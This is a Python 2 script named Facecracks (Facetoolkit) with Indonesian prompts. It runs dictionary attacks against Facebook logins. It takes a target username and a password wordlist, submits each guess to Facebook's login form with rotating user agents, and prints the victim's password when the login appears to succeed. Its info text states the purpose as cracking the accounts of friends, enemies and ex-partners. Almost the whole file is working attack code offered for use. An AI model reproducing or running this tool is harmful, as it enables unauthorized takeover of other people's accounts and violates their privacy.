#!/usr/bin/python
# -*- coding: utf-8 -*-
# Facetoolkit
# Coded by Nedi Senja
# Github: https://github.com/stepbystepexe/Facetoolkit

import os, sys, time, random, cookielib, mechanize, requests
from time import sleep

info = """
Nama        : Facecracks
Versi       : 4.1 (Update: 26 Februari 2020, 9:00 PM)
Tanggal     : 15 Agustus 2019
Author      : Nedi Senja
Tujuan      : Brefungsi untuk mengcracks password
              facebook teman, musuh & mantan
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \x1b[4mGunakan tool ini dengan bijak \x1b[0m]\n """

example = """\x1b[0;102;1;90m[         Facecracks, My Github: @stepbystepexe          ]\x1b[0m"""

logo = """
     \x1b[0;41;31m[ ]\x1b[0m~\x1b[0;42;32m[ ]\x1b[0m~\x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[-]\x1b[0m
          |              |
\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;46;1m  Face \x1b[0;97;45;1m  Tool  \033[0;90;43;1m  Facebook  \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m
                  \x1b[1;77m/\x1b[0m
     \x1b[0;90;47;1m * \x1b[0;1;104m Coded by \x1b[0;1;101m # Nedi Senja \x1b[0m
"""

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def loads():
    o = [
     '.   ', '..  ', '... ']
    for i in o:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' +i,
        sys.stdout.flush()
        time.sleep(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
sleep(1)
print
print(logo)
print
print("\033[0m[\033[1;96;2m1\033[0m] \033[1;77mMulai Mengcracks FB")
print
print("\033[0m[\033[93;1m&\033[0m] LISENSI")
print("\033[0m[\033[94;1m#\033[0m] Informasi")
print("\033[0m[\033[92;1m*\033[0m] Perbarui")
print("\033[0m[\033[91;1m-\033[0m] Keluar")
print
option = raw_input("\033[0m(\033[105;77;1m/\033[0m) \033[1;77mMasukan opsi: \033[0m")
if option.strip() in '1 cracks'.split():
    write("\n\033[0m[\033[32m●\033[0m] \033[77;1mSedang memproses ...\033[0m")
    sleep(1)
    os.system('clear')
    os.system('reset')
    sleep(1)
    print
    print(logo)
    print
    write("\033[0m[ \033[32mINFO \033[0m] \033[3mTool ini berfungsi untuk hek mantan biar balikan")
    write("         Kalo masih gx sayang santet aja bira mampos.. wk")
    print
    email_target = str(raw_input('\n\x1b[0m[\x1b[103;90;1m Username \x1b[0m] '))
    password_list = str(raw_input('\x1b[0m[\x1b[105;77;1m Wordlist \x1b[0m] '))
    login = 'https://www.facebook.com/login.php?login_attempt=1'
    useragents = [('Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/145.0.0.37.86;]')]
    print
elif option.strip() in '& 2 lisensi'.split():
    print
    os.system('nano LICENSE')
    print
    restart()
elif option.strip() in '# 3 info'.split():
    os.system('clear')
    print(example)
    os.system('toilet -f smslant Cracks')
    print(info)
    sleep(1)
    print
    raw_input('[ Tekan Enter ]')
    restart()
elif option.strip() in '* 4 perbarui'.split():
    print
    os.system('git pull origin master')
    print
    raw_input('\033[0m[ \033[32mTekan Enter \033[0m]')
    restart()
elif option.strip() in '- 0 keluar'.split():
    print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
    print
    sys.exit(1)
else:
    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
    print
    sleep(1)
    restart()

def edwordlst():
        print
        o = str(raw_input('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mEdit daftar kata (wordlist) \x1b[0m[Y/n]: '))
        if o.strip() in 'Y y'.split():
                os.system('nano '+password_list)
                restart()
        elif o.strip() in 'N n'.split():
                print
                print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKeluar dari program!')
                print
                sys.exit(1)
        else:
                print
                print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
                print
                edwordlst()
def main():
        global br
        reload(sys)
        sys.setdefaultencoding('utf8')
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        running()
        checker()
        print
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWordlist tidak ditemukan')
        print

def word(lst_password):
    try:
        sys.stdout.write('\n\x1b[0m[\x1b[94;1m '+email_target+'\x1b[0m ] \033[0;4mMencoba\033[0m \xf0\x9f\x91\x89\033[91;1m '+lst_password+'\x1b[0m')
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email_target
        br.form['pass'] = lst_password
        ok = br.submit()
        mask = ok.geturl()
        if mask != login and (not 'login_attempt' in mask):
                        os.system('xdg-open https://github.com/stepbystepexe/')
                        print
                        print ('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mBerhasil')
                        print ('\x1b[0m[\x1b[96;1m&\x1b[0m] \x1b[77;1mMendapatkan Sandi Korban')
                        print
                        print ('\x1b[0m[\x1b[95;1m$\x1b[0m] \x1b[0mUsername: \033[77;1m {}').format(email_target)
                        print ('\x1b[0m[\x1b[93;1m=\x1b[0m] \x1b[0mPassword: \033[77;1m {}').format(lst_password)
                        print
                        raw_input('\x1b[0m[ Tekan Enter ]')
                        restart()
    except KeyboardInterrupt:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti\x1b[0m')
        edwordlst()
        sys.exit(1)

def checker():
        global lst_password
        passw = open(password_list, "r")
        for lst_password in passw:
                passw = lst_password.replace("\n","")
                word(lst_password)

def running():
         global password_list
         print
         write ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMengecek User FB ...')
         print
         ok = open(password_list, 'r')
         ok = ok.readlines()
         sleep(5)
         print '\x1b[0m[\x1b[92;1m#\x1b[0m] Nama pengguna:\x1b[77;1m {}'.format(email_target)
         print '\x1b[0m[\x1b[93;1m*\x1b[0m] Daftar kata  :\x1b[77;1m',len(ok),'password'
         loads()
         print
         print
         sleep(5)

if __name__=='__main__':
        main()
